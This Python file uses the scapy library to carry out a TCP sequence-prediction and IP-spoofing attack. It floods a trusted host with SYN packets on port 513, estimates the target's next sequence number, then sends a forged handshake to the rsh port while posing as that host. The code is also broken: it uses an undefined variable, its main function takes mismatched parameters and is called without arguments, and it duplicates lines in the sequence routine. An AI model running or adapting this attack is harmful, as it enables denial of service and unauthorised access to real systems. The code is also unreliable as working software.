import optparse
from scapy.all import *
from scapy.layers.inet import IP, TCP

result =''
def synFlood(src, tgt):
    for sport in range(1024, 65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)


def calTSN(tgt):
    global result
    seqNum = 0
    preNum = 0
    diffSeq = 0

    for x in range(1, 5):
        if preNum != 0:
            preNum = seqNum
        pkt = IP(dst=tgt) / TCP()
        ans = sr1(pkt, verbose=0)
        seqNum = ans.getlayer(TCP).seq
        diffSeq = seqNum - preNum
        result+='[+] TCP Seq Difference: ' + str(diffSeq)+','

        result+= '[+] TCP Seq Difference: ' + str(diffSeq)+','
    return seqNum + diffSeq


def spoofConn(src, tgt, ack):
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    synPkt = IPlayer / TCPlayer
    send(synPkt)

    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ackPkt = IPlayer / TCPlayer
    send(ackPkt)


def main(synSpoof,srcFlood,tgt):
    global result 
    result+='[+] Starting SYN Flood to suppress remote server.,'
    synFlood(synSpoof, srcSpoof)
    result+='[+] Calculating correct TCP Sequence Number.,'
    seqNum = calTSN(tgt) + 1
    result+='[+] Spoofing Connection.,'
    spoofConn(srcSpoof, tgt, seqNum)
    result+='[+] Done.,'
    return result


if __name__ == '__main__':
    main()